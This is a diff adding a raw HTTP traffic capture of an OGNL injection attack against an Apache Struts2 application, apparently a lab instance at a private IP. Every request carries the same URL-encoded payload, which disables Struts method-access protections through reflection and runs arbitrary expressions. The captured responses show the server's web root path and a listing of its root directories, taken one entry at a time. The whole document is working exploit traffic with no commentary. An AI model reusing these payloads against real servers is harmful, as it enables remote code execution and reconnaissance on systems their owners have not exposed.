@@ -1,0 +1,522 @@
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 480
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots().length%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=23A8BB1BCA93D2F5D9586A4E4165F6F6; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 07:59:19 GMT
+
+2
+1
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 480
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=292FE92A587DBB6343DF481EDE145ED9; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 07:59:19 GMT
+
+2
+/
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 558
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23a.getRealPath(%22/%22)%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=ABDA03F5B07A970F216B03B4A6EECA08; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 07:59:19 GMT
+
+2d
+/root/apache-tomcat-8.0.3/webapps/struts2-16
+
+0
+
+
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 494
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.isDirectory()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=15F341E8E99B350BEC8F76E6A5A13732; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+5
+true
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 499
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles().length%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=5258C5949D8908429B72623D6533D067; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+3
+21
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b0%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=316E00594BFA2ACD29E6580178E22AA8; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+opt
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b1%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=9C147C9353951B36E8E75FFB92148D0C; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+dev
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b2%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=1429FE6A2E7790A26F9F4CA4C9080162; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+8
+selinux
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b3%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=272AAF0CA9F4142A51234D7FDA5FB7B0; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+bin
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b4%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=4FF451103DF249DC6B8605BFD06544FB; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+5
+root
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b5%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=07EECD56358827FE89CF456D66CE2720; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+b
+lost+found
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b6%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=2A178AE844EF3AD46DC34300077AD997; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+etc
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b7%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=0652707FFA433A2BFCD700CD367A5FBD; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+6
+media
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b8%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=DA3C480F142280C8C51DB39B5EBD5A0D; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+srv
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b9%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=57331868B3B0D6E39D5959F5F5E4EC67; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+sys
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b10%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=F5579C72E11168947E2F8935DAFE574E; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+lib
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b11%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=61EE04A75D344FAAC1789EDD1B96D117; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+mnt
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b12%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=F0781826A4192CEF88087AE655A76947; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+5
+home
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b13%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=D090D5708D6A1EE8D131D91A8578DE9B; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:10 GMT
+
+4
+var
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b14%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=F567F6739CCBF058DFBBB07717248E6A; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:11 GMT
+
+5
+boot
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b15%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=38C45A048B73EB8E8D6C528007963CE5; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:11 GMT
+
+4
+tmp
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b16%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=35FD771EC3E5306C02D5B72B7B97F15D; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:11 GMT
+
+4
+usr
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b17%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=05E0BCE6F6D807BEF45ACF3802113430; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:11 GMT
+
+a
+.autofsck
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b18%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=3BC91E05A8977C2DB8B45C087A5DC41C; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:11 GMT
+
+5
+sbin
+
+0
+
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 510
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b19%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=43F046290165E24B55D2E8A84E77A456; Path=/struts2-16/; HttpOnly
+Content-Type: text/plain;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Fri, 25 Sep 2015 08:00:11 GMT
+
+6
+lib64
+
+0
+
